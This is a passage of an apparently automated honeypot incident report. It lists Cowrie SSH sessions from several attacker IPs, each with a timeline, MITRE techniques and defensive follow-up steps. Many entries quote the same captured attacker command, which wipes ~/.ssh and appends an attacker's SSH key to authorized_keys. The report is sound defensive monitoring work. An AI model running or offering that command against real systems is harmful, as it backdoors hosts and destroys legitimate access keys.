| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:20:07` | `cowrie.session.connect` |
| `2026-06-12 14:20:07` | `cowrie.client.version` |
| `2026-06-12 14:20:07` | `cowrie.client.kex` |
| `2026-06-12 14:20:08` | `cowrie.login.success` |
| `2026-06-12 14:20:08` | `cowrie.session.params` |
| `2026-06-12 14:20:08` | `cowrie.command.input` |
| `2026-06-12 14:20:08` | `cowrie.command.failed` |
| `2026-06-12 14:20:08` | `cowrie.log.closed` |
| `2026-06-12 14:20:09` | `cowrie.session.params` |
| `2026-06-12 14:20:09` | `cowrie.command.input` |
| `2026-06-12 14:20:09` | `cowrie.session.file_download` |
| `2026-06-12 14:20:09` | `cowrie.log.closed` |
| `2026-06-12 14:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.117.50[.]180` to AbuseIPDB if not already reported
- [ ] Block `89.117.50[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad3a40a75bf5

| Field | Detail |
|---|---|
| **Source IP** | `89.117.50[.]180` |
| **First Seen** | 2026-06-12 14:20 |
| **Last Seen** | 2026-06-12 14:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:20:11` | `cowrie.session.connect` |
| `2026-06-12 14:20:11` | `cowrie.client.version` |
| `2026-06-12 14:20:11` | `cowrie.client.kex` |
| `2026-06-12 14:20:12` | `cowrie.login.success` |
| `2026-06-12 14:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.117.50[.]180` to AbuseIPDB if not already reported
- [ ] Block `89.117.50[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b4b158bfc57

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:22 |
| **Last Seen** | 2026-06-12 14:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:22:12` | `cowrie.session.connect` |
| `2026-06-12 14:22:12` | `cowrie.client.version` |
| `2026-06-12 14:22:13` | `cowrie.client.kex` |
| `2026-06-12 14:22:14` | `cowrie.login.success` |
| `2026-06-12 14:22:14` | `cowrie.session.params` |
| `2026-06-12 14:22:14` | `cowrie.command.input` |
| `2026-06-12 14:22:14` | `cowrie.command.failed` |
| `2026-06-12 14:22:15` | `cowrie.log.closed` |
| `2026-06-12 14:22:15` | `cowrie.session.params` |
| `2026-06-12 14:22:15` | `cowrie.command.input` |
| `2026-06-12 14:22:15` | `cowrie.session.file_download` |
| `2026-06-12 14:22:15` | `cowrie.log.closed` |
| `2026-06-12 14:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99fa88ddd87

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:22 |
| **Last Seen** | 2026-06-12 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:22:18` | `cowrie.session.connect` |
| `2026-06-12 14:22:18` | `cowrie.client.version` |
| `2026-06-12 14:22:19` | `cowrie.client.kex` |
| `2026-06-12 14:22:20` | `cowrie.login.success` |
| `2026-06-12 14:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc8ca3f9efd9

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 14:22 |
| **Last Seen** | 2026-06-12 14:22 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:22:33` | `cowrie.session.connect` |
| `2026-06-12 14:22:33` | `cowrie.client.version` |
| `2026-06-12 14:22:33` | `cowrie.client.kex` |
| `2026-06-12 14:22:34` | `cowrie.login.success` |
| `2026-06-12 14:22:35` | `cowrie.session.params` |
| `2026-06-12 14:22:35` | `cowrie.command.input` |
| `2026-06-12 14:22:35` | `cowrie.command.failed` |
| `2026-06-12 14:22:35` | `cowrie.log.closed` |
| `2026-06-12 14:22:36` | `cowrie.session.params` |
| `2026-06-12 14:22:36` | `cowrie.command.input` |
| `2026-06-12 14:22:37` | `cowrie.session.file_download` |
| `2026-06-12 14:22:37` | `cowrie.log.closed` |
| `2026-06-12 14:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d8840a6c44f

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 14:22 |
| **Last Seen** | 2026-06-12 14:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:22:43` | `cowrie.session.connect` |
| `2026-06-12 14:22:43` | `cowrie.client.version` |
| `2026-06-12 14:22:43` | `cowrie.client.kex` |
| `2026-06-12 14:22:45` | `cowrie.login.success` |
| `2026-06-12 14:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29e8363ca1df

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:31 |
| **Last Seen** | 2026-06-12 14:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:31:47` | `cowrie.session.connect` |
| `2026-06-12 14:31:47` | `cowrie.client.version` |
| `2026-06-12 14:31:47` | `cowrie.client.kex` |
| `2026-06-12 14:31:48` | `cowrie.login.success` |
| `2026-06-12 14:31:49` | `cowrie.session.params` |
| `2026-06-12 14:31:49` | `cowrie.command.input` |
| `2026-06-12 14:31:49` | `cowrie.command.failed` |
| `2026-06-12 14:31:49` | `cowrie.log.closed` |
| `2026-06-12 14:31:49` | `cowrie.session.params` |
| `2026-06-12 14:31:49` | `cowrie.command.input` |
| `2026-06-12 14:31:50` | `cowrie.session.file_download` |
| `2026-06-12 14:31:50` | `cowrie.log.closed` |
| `2026-06-12 14:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6be26799264

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:31 |
| **Last Seen** | 2026-06-12 14:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:31:53` | `cowrie.session.connect` |
| `2026-06-12 14:31:53` | `cowrie.client.version` |
| `2026-06-12 14:31:53` | `cowrie.client.kex` |
| `2026-06-12 14:31:54` | `cowrie.login.success` |
| `2026-06-12 14:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05d768d4c108

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 14:38 |
| **Last Seen** | 2026-06-12 14:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:38:50` | `cowrie.session.connect` |
| `2026-06-12 14:38:50` | `cowrie.client.version` |
| `2026-06-12 14:38:50` | `cowrie.client.kex` |
| `2026-06-12 14:38:52` | `cowrie.login.success` |
| `2026-06-12 14:38:52` | `cowrie.session.params` |
| `2026-06-12 14:38:52` | `cowrie.command.input` |
| `2026-06-12 14:38:52` | `cowrie.command.failed` |
| `2026-06-12 14:38:53` | `cowrie.log.closed` |
| `2026-06-12 14:38:54` | `cowrie.session.params` |
| `2026-06-12 14:38:54` | `cowrie.command.input` |
| `2026-06-12 14:38:54` | `cowrie.session.file_download` |
| `2026-06-12 14:38:54` | `cowrie.log.closed` |
| `2026-06-12 14:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b83e2bd4a15

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 14:38 |
| **Last Seen** | 2026-06-12 14:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:38:58` | `cowrie.session.connect` |
| `2026-06-12 14:38:58` | `cowrie.client.version` |
| `2026-06-12 14:38:58` | `cowrie.client.kex` |
| `2026-06-12 14:38:59` | `cowrie.login.success` |
| `2026-06-12 14:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8088c50f6ca4

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:41 |
| **Last Seen** | 2026-06-12 14:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:41:21` | `cowrie.session.connect` |
| `2026-06-12 14:41:21` | `cowrie.client.version` |
| `2026-06-12 14:41:21` | `cowrie.client.kex` |
| `2026-06-12 14:41:22` | `cowrie.login.success` |
| `2026-06-12 14:41:23` | `cowrie.session.params` |
| `2026-06-12 14:41:23` | `cowrie.command.input` |
| `2026-06-12 14:41:23` | `cowrie.command.failed` |
| `2026-06-12 14:41:23` | `cowrie.log.closed` |
| `2026-06-12 14:41:23` | `cowrie.session.params` |
| `2026-06-12 14:41:23` | `cowrie.command.input` |
| `2026-06-12 14:41:24` | `cowrie.session.file_download` |
| `2026-06-12 14:41:24` | `cowrie.log.closed` |
| `2026-06-12 14:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08b15d2e1544

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:41 |
| **Last Seen** | 2026-06-12 14:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:41:27` | `cowrie.session.connect` |
| `2026-06-12 14:41:27` | `cowrie.client.version` |
| `2026-06-12 14:41:27` | `cowrie.client.kex` |
| `2026-06-12 14:41:28` | `cowrie.login.success` |
| `2026-06-12 14:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f26e32f626

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 14:54 |
| **Last Seen** | 2026-06-12 14:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:54:55` | `cowrie.session.connect` |
| `2026-06-12 14:54:55` | `cowrie.client.version` |
| `2026-06-12 14:54:56` | `cowrie.client.kex` |
| `2026-06-12 14:54:57` | `cowrie.login.success` |
| `2026-06-12 14:54:58` | `cowrie.session.params` |
| `2026-06-12 14:54:58` | `cowrie.command.input` |
| `2026-06-12 14:54:58` | `cowrie.command.failed` |
| `2026-06-12 14:54:58` | `cowrie.log.closed` |
| `2026-06-12 14:54:59` | `cowrie.session.params` |
| `2026-06-12 14:54:59` | `cowrie.command.input` |
| `2026-06-12 14:54:59` | `cowrie.session.file_download` |
| `2026-06-12 14:54:59` | `cowrie.log.closed` |
| `2026-06-12 14:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be761d1ca2bb

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 14:55 |
| **Last Seen** | 2026-06-12 14:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:55:03` | `cowrie.session.connect` |
| `2026-06-12 14:55:03` | `cowrie.client.version` |
| `2026-06-12 14:55:03` | `cowrie.client.kex` |
| `2026-06-12 14:55:04` | `cowrie.login.success` |
| `2026-06-12 14:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-030cbeaf4dc2

| Field | Detail |
|---|---|
| **Source IP** | `192.3.150[.]139` |
| **First Seen** | 2026-06-12 15:00 |
| **Last Seen** | 2026-06-12 15:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 15:00:07` | `cowrie.session.connect` |
| `2026-06-12 15:00:07` | `cowrie.client.version` |
| `2026-06-12 15:00:08` | `cowrie.client.kex` |
| `2026-06-12 15:00:09` | `cowrie.login.success` |
| `2026-06-12 15:00:09` | `cowrie.session.params` |
| `2026-06-12 15:00:09` | `cowrie.command.input` |
| `2026-06-12 15:00:09` | `cowrie.command.failed` |
| `2026-06-12 15:00:10` | `cowrie.log.closed` |
| `2026-06-12 15:00:10` | `cowrie.session.params` |
| `2026-06-12 15:00:10` | `cowrie.command.input` |
| `2026-06-12 15:00:10` | `cowrie.session.file_download` |
| `2026-06-12 15:00:10` | `cowrie.log.closed` |
| `2026-06-12 15:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.3.150[.]139` to AbuseIPDB if not already reported
- [ ] Block `192.3.150[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bee58748d55f

| Field | Detail |
|---|---|
| **Source IP** | `192.3.150[.]139` |
| **First Seen** | 2026-06-12 15:00 |
| **Last Seen** | 2026-06-12 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 15:00:15` | `cowrie.session.connect` |
| `2026-06-12 15:00:15` | `cowrie.client.version` |
| `2026-06-12 15:00:15` | `cowrie.client.kex` |
| `2026-06-12 15:00:16` | `cowrie.login.success` |
| `2026-06-12 15:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.3.150[.]139` to AbuseIPDB if not already reported
- [ ] Block `192.3.150[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58cb5a1c8f6e

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 15:06 |
| **Last Seen** | 2026-06-12 15:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 15:06:55` | `cowrie.session.connect` |
| `2026-06-12 15:06:55` | `cowrie.client.version` |
| `2026-06-12 15:06:55` | `cowrie.client.kex` |
| `2026-06-12 15:06:57` | `cowrie.login.success` |
| `2026-06-12 15:06:57` | `cowrie.session.params` |
| `2026-06-12 15:06:57` | `cowrie.command.input` |
| `2026-06-12 15:06:57` | `cowrie.command.failed` |
| `2026-06-12 15:06:58` | `cowrie.log.closed` |
| `2026-06-12 15:06:58` | `cowrie.session.params` |
| `2026-06-12 15:06:58` | `cowrie.command.input` |
| `2026-06-12 15:06:59` | `cowrie.session.file_download` |
| `2026-06-12 15:06:59` | `cowrie.log.closed` |
| `2026-06-12 15:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ec44fd63e77

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 15:07 |
| **Last Seen** | 2026-06-12 15:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |
